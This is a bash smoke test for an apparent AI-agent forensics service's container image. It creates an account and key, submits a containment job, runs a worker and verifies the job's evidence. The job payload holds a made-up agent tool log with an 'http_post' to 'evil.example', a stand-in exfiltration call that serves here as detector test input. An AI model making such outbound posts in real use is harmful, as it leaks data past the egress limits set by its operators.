#!/usr/bin/env bash
# End-to-end check of the container image: start the API, create an account and
# key with the admin CLI, submit a forensics job, run the worker once in a second
# container on the same volume, then fetch the result and verify its evidence.
# Uses placeholder Stripe test values only; no network calls to Stripe are made.
set -euo pipefail

IMAGE="${1:-ai-enterprise-agency:local}"
NAME="agency-smoke-$$"
VOLUME="agency-smoke-$$"
PORT="${PORT:-18000}"
ENV=(-e AGENCY_STRIPE_API_KEY=sk_test_smoke -e AGENCY_STRIPE_WEBHOOK_SECRET=whsec_smoke)

cleanup() {
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  docker volume rm "$VOLUME" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker volume create "$VOLUME" >/dev/null
docker run -d --name "$NAME" "${ENV[@]}" -v "$VOLUME:/data" -p "127.0.0.1:$PORT:8000" "$IMAGE" >/dev/null

for _ in $(seq 1 30); do
  if curl -fsS "http://127.0.0.1:$PORT/readyz" >/dev/null 2>&1; then break; fi
  sleep 1
done
curl -fsS "http://127.0.0.1:$PORT/readyz"; echo

account=$(docker exec "$NAME" python -m api.admin create-account --email smoke@example.test --quota 50 --status active \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["account_id"])')
key=$(docker exec "$NAME" python -m api.admin issue-key --account "$account" --label smoke \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["api_key"])')
auth=(-H "Authorization: Bearer $key")

agents=$(curl -fsS "${auth[@]}" "http://127.0.0.1:$PORT/api/v1/agents?source=custom" \
  | python3 -c 'import json,sys; print(len(json.load(sys.stdin)["agents"]))')
test "$agents" = "8" || { echo "expected 8 custom agents, got $agents"; exit 1; }
curl -fsS "http://127.0.0.1:$PORT/dashboard/" | grep -q "AI Audit Agency" || { echo "dashboard not served"; exit 1; }

body='{"subject":{"agent_name":"bot","runtime":"langgraph","declared_egress_allowlist":["api.internal"]},
"artifacts":[{"artifact_id":"A1","kind":"tool_log","content":[{"ts":"2026-01-01T00:00:00Z","tool":"http_post",
"args":{"url":"https://evil.example/x"},"session_id":"s1"}]}]}'
job=$(curl -fsS "${auth[@]}" -H "Content-Type: application/json" -d "$body" \
  "http://127.0.0.1:$PORT/api/v1/forensics/contain" | python3 -c 'import json,sys; print(json.load(sys.stdin)["job_id"])')

docker run --rm "${ENV[@]}" -v "$VOLUME:/data" "$IMAGE" python -m core.worker --once

status=$(curl -fsS "${auth[@]}" "http://127.0.0.1:$PORT/api/v1/jobs/$job" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["status"])')
test "$status" = "succeeded" || { echo "job status is $status"; exit 1; }

curl -fsS "${auth[@]}" "http://127.0.0.1:$PORT/api/v1/jobs/$job/report" | head -5
valid=$(curl -fsS "${auth[@]}" "http://127.0.0.1:$PORT/api/v1/jobs/$job/evidence" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["verification"]["valid"])')
test "$valid" = "True" || { echo "evidence did not verify"; exit 1; }

test "$(docker exec "$NAME" id -u)" != "0" || { echo "container runs as root"; exit 1; }
echo "smoke test passed: job $job succeeded with verified evidence"
